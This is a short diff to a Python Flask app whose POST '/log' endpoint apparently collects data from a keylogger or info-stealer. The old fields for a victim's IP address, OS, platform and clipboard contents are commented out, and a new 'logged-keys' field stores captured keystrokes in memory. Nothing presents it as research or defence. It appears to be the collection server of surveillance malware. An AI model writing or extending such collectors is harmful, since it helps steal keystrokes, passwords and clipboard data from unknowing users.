@@ -7,10 +7,11 @@ dummy = []
 @app.route('/log', methods = ['POST'])
 def home():
     data = {
-        "network_info": request.json['ip'],
-        "os_name": request.json['os'],
-        "platform": request.json['platform'],
-        "clipboard": request.json['clipboard']
+        #"network_info": request.json['ip'],
+        #"os_name": request.json['os'],
+        #"platform": request.json['platform'],
+        #"clipboard": request.json['clipboard'],
+        "logged-keys": request.json['keys']
     }
     dummy.append(data)
     return data
